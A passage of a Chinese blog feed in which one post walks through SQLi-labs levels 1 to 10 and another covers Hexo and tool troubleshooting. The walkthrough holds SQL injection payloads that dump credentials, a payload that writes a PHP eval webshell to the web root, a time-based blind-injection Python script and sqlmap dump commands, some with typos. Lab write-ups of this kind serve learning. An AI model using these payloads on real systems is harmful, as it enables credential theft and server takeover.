class="hljs-keyword">group_concat</span>(username,<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>0x3a 代表十六进制的 ‘ ： ’</p><p><strong>方法二：手动报错注入</strong></p><p>通过报错回显查询信息</p><p>1，爆数据库名：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">?id=<span class="hljs-number">1</span>&#x27; and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(database()))) --+<br></code></pre></td></tr></table></figure><p>2,爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id=1&#x27; and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()))) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>3，4，直接将 <strong>extractvalue(1,concat(0x7e,(……) ) )</strong>  内的内容修改即可。或者用 <strong>updatexml（1，concat(0x7e,(……),1）</strong></p><p><img src="/2020/12/09/2021/sql/1-10/%E6%8D%95%E8%8E%B7.PNG"></p><h4 id="Less-2：-GET型整型注入）"><a href="#Less-2：-GET型整型注入）" class="headerlink" title="Less 2：(GET型整型注入）"></a>Less 2：(GET型整型注入）</h4><p> 今天成功安装了hackbar的旧版本</p><p> 链接地址为：<a href="https://github.com/HCTYMFF/hackbar2.1.3">https://github.com/HCTYMFF/hackbar2.1.3</a> （在火狐浏览器上使用）</p><p> 先采用</p><p>?id=1 union select 1,2,3–+  发现可行</p><p>与之前一样，又在1后加入了引号，出现语法报错</p><p>删掉分号，我们修改语句</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?id=<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">group</span>(<span class="hljs-title">schema_name</span>)<span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">schemata</span>--+</span><br></code></pre></td></tr></table></figure><p>查到关于数据库内部数据</p><p>接着修改</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">group</span>(<span class="hljs-built_in">schema_name</span>)<span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>这里建议将security修改为16进制，0x开头，英文单词用hackbar里的工具转换为16进制数</p><p>之后修改为username</p><p>得到username和password字名</p><p>然后同第一关一样，我们需要让它出现所有的数据</p><p>慢慢来</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?id=<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">contact_ws</span>(,~<span class="hljs-title">username</span>,<span class="hljs-title">password</span>)<span class="hljs-title">from</span> <span class="hljs-title">securiy</span>.<span class="hljs-title">uesers</span>--+</span><br></code></pre></td></tr></table></figure><p>同样这里的~使用十六进制，修改为0x7e</p><p>我们再加group_concat 函数得到</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">?id=-<span class="hljs-number">1221</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">gruop_concat</span>(<span class="hljs-title">concat_ws</span>(0<span class="hljs-title">x7e</span>,<span class="hljs-title">username</span>,<span class="hljs-title">password</span>)<span class="hljs-title">from</span> <span class="hljs-title">security</span>.<span class="hljs-title">users</span>--+</span><br></code></pre></td></tr></table></figure><p>tip:这边加负号是使得id=1失去作用。</p><p>最后回显数据，得到链接为：<a href="http://localhost/Less-2/?id=-1221">http://localhost/Less-2/?id=-1221</a> union select 1,2,group_concat(concat_ws(0x7e,username,password))from security.users–+<img src="/2020/12/09/2021/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(11).png"></p><h4 id="Less-3-基于错误的get单引号变形字符注入"><a href="#Less-3-基于错误的get单引号变形字符注入" class="headerlink" title="Less-3 (基于错误的get单引号变形字符注入)"></a>Less-3 (基于错误的get单引号变形字符注入)</h4><p>输入 id=1 正常，输入id=1’ # 回显错误 ，根据报错信息确定咱们输入的内容存放到一对单引号加圆括号中了，猜想一下咱们输入1在数据库语句中的位置，形如select … from … where id=(‘1’) …，在第一题中id=1‘的后面单引号加上），其它保持不变就行了</p><h4 id="Less-4-基于错误的get双引号字符型注入"><a href="#Less-4-基于错误的get双引号字符型注入" class="headerlink" title="Less-4 (基于错误的get双引号字符型注入)"></a>Less-4 (基于错误的get双引号字符型注入)</h4><p>输入 id =1 回显正常  输入 id =1’ 回显正常  输入 id = 1” 回显错误  说明是 双引号闭合型</p><p>输入 id = 1” %23 回显错误  说明还有一个 单括号闭合 </p><p>输入 id = 1”) …… 其他不变</p><h4 id="Less-5-双注入get单引号字符型注入"><a href="#Less-5-双注入get单引号字符型注入" class="headerlink" title="Less-5(双注入get单引号字符型注入)"></a>Less-5(双注入get单引号字符型注入)</h4><p> 第五关与前四关不同，没有了明显的回显，经过资料查询为布尔盲注（bool）</p><p>与之前一样我们先利用基本语句，发现id=1’时报错，存在注入；</p><p>之后用order by语句查询到至多只有3行；</p><p>但是没有了明显的回显后，我们不能再使用union select 联合查询来寻找我们要的数据；</p><p>这个时候就使用新的语句 and left(( select database()),1) 进行试探，或是直接进入MySQL控制台使用语句进行查询更加直观</p><p>这是用sqlmap跑的数据图</p><p><img src="/2020/12/09/2021/sql/1-10/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(12).png"></p><p>最后的数据为‘security’   </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost/Less-<span class="hljs-number">5</span>/?id=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>left%<span class="hljs-number">20</span>((select%<span class="hljs-number">20</span>database()),<span class="hljs-number">8</span>)=%<span class="hljs-number">27</span>security%<span class="hljs-number">27</span>--+<br></code></pre></td></tr></table></figure><p>这里推荐函数链接：：<a href="https://blog.csdn.net/qq_43573676/article/details/105774162">https://blog.csdn.net/qq_43573676/article/details/105774162</a></p><h4 id="Less-6-双注入get双引号字符型注入"><a href="#Less-6-双注入get双引号字符型注入" class="headerlink" title="Less-6 (双注入get双引号字符型注入)"></a>Less-6 (双注入get双引号字符型注入)</h4><p>只用将less 5 中的单引号改为 双引号即可</p><h4 id="Less-7-导出文件get字符型注入"><a href="#Less-7-导出文件get字符型注入" class="headerlink" title="Less-7 (导出文件get字符型注入)"></a>Less-7 (导出文件get字符型注入)</h4><p>1，补充：<br>@@basedir ：mysql安装路径</p><p>@@datadir ：数据库路径</p><p><strong>load_file(file_name)：读取文件并返回该文件的内容作为一个字符串</strong></p><p><strong>使用条件：必须有权限读取并且文件可读，必须指定文件完整的路径</strong></p><p>2，由于我不是在本地搭载的环境，所以知道具体的数据存放路径，需要去获取绝对路径，</p><p>前面知道 本题是 单引号 加双括号 的闭合方式：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?id=<span class="hljs-number">-1</span>&#x27;)) <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-comment">@@</span>datadir --+<br></code></pre></td></tr></table></figure><p>获取不了 路径</p><p>于是去前面的简单的题找个路径：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal">Less-<span class="hljs-number">7</span>/?id=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,@@<span class="hljs-title">basedir</span>,@@<span class="hljs-title">datadir</span> --+</span><br></code></pre></td></tr></table></figure><p>得到路经：<img src="https://img-blog.csdnimg.cn/20190511131738156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p><p>进行文件导入：(这里要用 \ ）</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">http://127.0.0.1/sql/Less-7/?id=-1&#x27;)) union select 1,2,&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sql\\Less-7\\test.php&quot; --+</span><br></code></pre></td></tr></table></figure><p><img src="/2020/12/09/2021/sql/1-10/image-20220304104500197.png" alt="image-20220304104500197"></p><p><strong>需要注意的是：利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖，所以如果第一次上传chao.php，下次在上传chao.php，就是无效命令了，也就是新的chao,php中的内容并不会覆盖，之前的chao.php</strong></p><p>然后用菜刀进行连接</p><p> 我自己在尝试第七关的时候，发生了很多次失败，导致sql靶场一度搁浅</p><p>现在想想错误应该是这几个：</p><p>1.没有//，因为遇到转义时需用//才能使得浏览器解析时为我们自己想要的。</p><p>2.格式没有完全对，之前借鉴的博客里可能有一些问题（无意冒犯一些大佬）。</p><p>3.对于什么是一句话木马没有一点了解，就连工具antsword也是装了很久才成功。</p><p>现在重新撸一下就ok了，记得一句话木马的时候引号会变成乱码，直接在post里写1就好</p><p><img src="/2020/12/09/2021/sql/1-10/image-20220304212018636.png" alt="image-20220304212018636"></p><h4 id="Less-8-布尔型单引号GET盲注"><a href="#Less-8-布尔型单引号GET盲注" class="headerlink" title="Less-8 (布尔型单引号GET盲注)"></a>Less-8 (布尔型单引号GET盲注)</h4><p>1，补充：</p><p><strong>（1）盲注分为两类：<br>　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong></p><p>（2）</p><p>–batch ： 让sqlmap自动输入</p><p>–dbms mysql   ：指定数据库系统为mysql绕过sqlmap的自动检测</p><p>-v 显示 等级（0-6）</p><p><strong>方法一 ：用sqlmap 按部就班的</strong> 来，最后一步的payload 为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap.py -u <span class="hljs-string">&quot;http://43.247.91.228:84/Less-8/?id=2&quot;</span> --dbms mysql --batch -v 1 --dump -D security -T<span class="hljs-built_in"> users </span>-C <span class="hljs-string">&quot;id,password,username&quot;</span><br></code></pre></td></tr></table></figure><p><strong>方法二： 用脚本进行 盲注</strong> </p><p>具体操作 参考 <a href="https://blog.csdn.net/wy_97/article/details/78169623">https://blog.csdn.net/wy_97/article/details/78169623</a> 的详细操作</p><p><img src="/2020/12/09/2021/sql/1-10/image-20220304110331429.png" alt="image-20220304110331429"></p><p><strong>方法三： 完全可以按照之前方法慢慢来爆破</strong></p><h4 id="Less-9-基于时间的GET单引号盲注"><a href="#Less-9-基于时间的GET单引号盲注" class="headerlink" title="Less-9 (基于时间的GET单引号盲注)"></a>Less-9 (基于时间的GET单引号盲注)</h4><p>脚本gogogo</p><p>1，<strong>补充：时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</strong></p><p>2，手工注入实在是太麻烦，将手工注入整理一下写出一个脚本 让机器去注入</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>value =<span class="hljs-string">&quot;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@_.-&quot;</span><br><br><br>data=<span class="hljs-string">&quot;&quot;</span><br><br>url = <span class="hljs-string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((ascii(substr((&#123;0&#125; limit 3,1),&#123;1&#125;,1)) = &#x27;&#123;2&#125;&#x27;),sleep(3),NULL); %23&quot;</span><br><br><br>url_length=<span class="hljs-string">&quot;http://43.247.91.228:84/Less-9/?id=1&#x27; and if((length((&#123;0&#125; limit 3,1))=&#123;1&#125; ),sleep(3),NULL); %23&quot;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_length</span>(<span class="hljs-params">payload</span>):</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br><br>        url= url_length.format(payload,n)<br>        print(url)<br>        <span class="hljs-keyword">if</span>(get_respone(url)):<br>            print(<span class="hljs-string">&quot;[+] length is &#123;0&#125;&quot;</span>.format(n))<br>            <span class="hljs-keyword">return</span> n<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_data</span>(<span class="hljs-params">payload,value,length</span>):</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,length):<br>        <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> value :<br>            url_data = url.format(payload,n,ord(v))<br>            print(url_data)<br>            <span class="hljs-keyword">if</span>(get_respone(url_data)):<br>                <span class="hljs-keyword">global</span> data<br>                data=data+v<br>                print(<span class="hljs-string">&quot;[+] data is &#123;0&#125;&quot;</span>.format(data))<br>                <span class="hljs-keyword">break</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_respone</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        html = requests.get(url,timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(<span class="hljs-string">&quot;......&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>databse_payload =<span class="hljs-string">&quot;select  table_name from information_schema.tables where table_schema = database()&quot;</span><br><br><br>get_data(databse_payload,value,get_length(databse_payload)+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><strong>这个脚本你每次只能查询 一个内容，</strong></p><p><strong>需要不断改变 4，5，行中 limit x，1 的 x 的数字去查询，</strong></p><p><strong>也需要改变 database_payload 去查询不同的信息</strong></p><h4 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 (基于时间的双引号盲注)"></a>Less-10 (基于时间的双引号盲注)</h4><p>1，只用将第9题中的单引号改为双引号，其他用脚本注入就好</p><p><strong>注意，在脚本的第 4，5中的所有的单引号都改为双引号</strong></p><h1 id><a href="#" class="headerlink" title></a></h1><h4 id="sqlmap-post类型注入方法："><a href="#sqlmap-post类型注入方法：" class="headerlink" title="sqlmap post类型注入方法："></a>sqlmap post类型注入方法：</h4><p><strong><em>\</em>方法一：（“-r txt ”方式注入）**</strong></p><p>1，先用burp suite 抓包，保存为1.txt文件放在桌面上</p><p><img src="https://img-blog.csdnimg.cn/20190523221451758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p><p>2，打开sqlmap</p><p>查询数据库名：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">python sqlmap.py -r &quot;c:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\H</span>P<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\1</span>.txt&quot; -p id --dbs<br></code></pre></td></tr></table></figure><p>注：-r表示加载一个文件，-p指定参数</p><p>之后对应选择输入 ： Y    N     Y</p><p>得到：<img src="https://img-blog.csdnimg.cn/20190523221840906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Zoa2pod2Jz,size_16,color_FFFFFF,t_70" alt="img"></p><p>之后查表：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">python2 sqlmap.py -r &quot;c:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\H</span>P<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\1</span>.txt&quot; -p id --D skctf_flag --tables<br></code></pre></td></tr></table></figure><p>查字段：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -r <span class="hljs-string">&quot;c:\Users\HP\Desktop\1.txt&quot;</span> -<span class="hljs-selector-tag">p</span> id --D database_name -T table_name --<span class="hljs-attribute">columns</span><br></code></pre></td></tr></table></figure><p>查内容：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">python2 sqlmap.py -r &quot;c:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\H</span>P<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\1</span>.txt&quot; -p id --D database_name -T table_name -C column_name --dump<br></code></pre></td></tr></table></figure><h5 id="此文大部分方法和内容转载于"><a href="#此文大部分方法和内容转载于" class="headerlink" title="此文大部分方法和内容转载于"></a>此文大部分方法和内容转载于</h5><p><a href="https://blog.csdn.net/vhkjhwbs/article/details/89740401">https://blog.csdn.net/vhkjhwbs/article/details/89740401</a></p>]]></content>
      
      
      <categories>
          
          <category> SQL-lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客解疑</title>
      <link href="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/"/>
      <url>/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
      
        <content type="html"><![CDATA[<h3 id="1-当输入hexo-g发布博文并预览时出现下面的提示："><a href="#1-当输入hexo-g发布博文并预览时出现下面的提示：" class="headerlink" title="1.当输入hexo -g发布博文并预览时出现下面的提示："></a>1.当输入hexo -g发布博文并预览时出现下面的提示：</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran">YAMLException: can not read a <span class="hljs-keyword">block</span> mapping <span class="hljs-built_in">entry</span>; a multiline key may not be an <span class="hljs-keyword">implicit</span> key at line x, column y:<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p><p>如果标题用诸如[网鼎杯] 2020 青龙组AreUSerialz的时候，会出现报错</p><p>原因猜测为hexo标题默认加上了[ ],我们再次添加这个符号就会产生报错。</p><h3 id="2-hexo-s-时出现报错"><a href="#2-hexo-s-时出现报错" class="headerlink" title="2.hexo -s 时出现报错"></a>2.hexo -s 时出现报错</h3><p>Port 4000 has been used. Try other port instead.</p><p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p><p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">4001</span> <span class="hljs-comment">#端口号随意，默认是4000</span><br>  <span class="hljs-attr">compress:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">header:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="3-hexo-上传图片"><a href="#3-hexo-上传图片" class="headerlink" title="3.hexo-上传图片"></a>3.hexo-上传图片</h3><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p><p>重新看了下csdn上一篇好文章</p><p>附上链接：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/xjm<span class="hljs-number">850552586</span>/article/details/<span class="hljs-number">84101345</span>?ops_request_misc=%<span class="hljs-number">25257</span>B%<span class="hljs-number">252522</span>request%<span class="hljs-number">25255</span>Fid%<span class="hljs-number">252522</span>%<span class="hljs-number">25253</span>A%<span class="hljs-number">252522161371871416780266219548</span>%<span class="hljs-number">252522</span>%<span class="hljs-number">25252</span>C%<span class="hljs-number">252522</span>scm%<span class="hljs-number">252522</span>%<span class="hljs-number">25253</span>A%<span class="hljs-number">25252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">252522</span>%<span class="hljs-number">25257</span>D&amp;request_id=<span class="hljs-number">161371871416780266219548</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~sobaiduend~default-<span class="hljs-number">1</span>-<span class="hljs-number">84101345</span>.pc_search_result_before_js&amp;utm_term=hexo%<span class="hljs-number">25</span>E<span class="hljs-number">5</span>%<span class="hljs-number">259</span>B%<span class="hljs-number">25</span>BE%<span class="hljs-number">25</span>E<span class="hljs-number">7</span>%<span class="hljs-number">2589</span>%<span class="hljs-number">2587</span><br><br><br></code></pre></td></tr></table></figure><p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p><p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p><h3 id="4-burp-intruder模块爆破出现"><a href="#4-burp-intruder模块爆破出现" class="headerlink" title="4.burp intruder模块爆破出现"></a>4.burp intruder模块爆破出现</h3><h3 id="Payload-set-1-Invalid-number-settings的解决办法"><a href="#Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="Payload set 1: Invalid number settings的解决办法"></a>Payload set 1: Invalid number settings的解决办法</h3><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="5-Python数据可视化利器Matplotlib，无法显示中文，怎么办？"><a href="#5-Python数据可视化利器Matplotlib，无法显示中文，怎么办？" class="headerlink" title="5.Python数据可视化利器Matplotlib，无法显示中文，怎么办？"></a>5.Python数据可视化利器Matplotlib，无法显示中文，怎么办？</h3><p><a href="https://zhuanlan.zhihu.com/p/104081310?utm_source=wechat_timeline">彻底解决Python里matplotlib不显示中文的问题 - 知乎 (zhihu.com)</a></p><p>在自己的代码里加入如下代码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">import matplotlib<br>matplotlib.rc(&quot;font&quot;,family=&#x27;YouYuan&#x27;)<br></code></pre></td></tr></table></figure><p>解决<img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210527201252662.png" alt="image-20210527201252662"></p><h3 id="6-在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？"><a href="#6-在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？" class="headerlink" title="6.在使用phpstudy启动apache服务器时一直出现  PHP startup  弹窗怎么办？"></a>6.在使用phpstudy启动apache服务器时一直出现  PHP startup  弹窗怎么办？</h3><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111000310.png" alt="image-20210726111000310"></p><p>上网查找后得知，这于php.ini配制文件有关</p><p>1.对于里面的扩展文件，若目录下无文件需要用；加以关闭。</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111308665.png" alt="image-20210726111308665"></p><p>如图，这里的</p><p>extension=php_xmlrpc.dll在对应文件夹里并没有，所以我们加上分号来关闭。</p><p>2.路径的添加：</p><p>打开php.ini，如找到extension_dir修改为：</p><p><strong>extension_dir = “D:/Program/WAMP/php/ext”</strong></p><p>引号内使用绝对路径即可。</p><h3 id="7-扫描工具Dirsearch的安装与使用"><a href="#7-扫描工具Dirsearch的安装与使用" class="headerlink" title="7.扫描工具Dirsearch的安装与使用"></a>7.扫描工具Dirsearch的安装与使用</h3><p>记录一下啊，调试了好长一段时间才成功的扫描工具<strong>dirsearch</strong></p><p>总结运行成功的几个条件：</p><p>1.安装python版本3.7及以上，且要确保cmd命令行内默认版本正确（因为之前我为了使用GitHack而更改了python解释器）。</p><p>2.遇到如下报错时：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\dirsearch.py&quot;</span>, line <span class="hljs-number">28</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.controller.controller <span class="hljs-keyword">import</span> Controller<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> .controller <span class="hljs-keyword">import</span> Controller  <span class="hljs-comment"># noqa: F401</span><br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\controller\controller.py&quot;</span>, line <span class="hljs-number">29</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> lib.connection.requester <span class="hljs-keyword">import</span> Requester<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\lib\connection\requester.py&quot;</span>, line <span class="hljs-number">30</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> thirdparty.requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\__init__.py&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span 